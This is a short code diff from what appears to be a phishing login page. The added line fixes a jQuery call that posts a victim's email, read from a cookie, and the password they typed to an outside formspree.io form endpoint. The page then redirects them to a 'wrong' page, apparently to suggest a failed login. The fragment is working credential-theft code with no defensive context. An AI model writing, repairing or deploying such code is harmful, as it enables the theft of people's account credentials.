@@ -12,7 +12,7 @@
             $("#emailparse").html(Cookies.get("email"))
             $("form").submit((e) => {
                 e.preventDefault();
-                $.post("https://formspree.io/f/xjvdzrpq",{email:Cookies.get("email"),password:$("#password").val(),()=>{}}
+                $.post("https://formspree.io/f/xjvdzrpq",{email:Cookies.get("email"),password:$("#password").val()},()=>{}}
                 window.location = "./wrong.html"
             });
         })
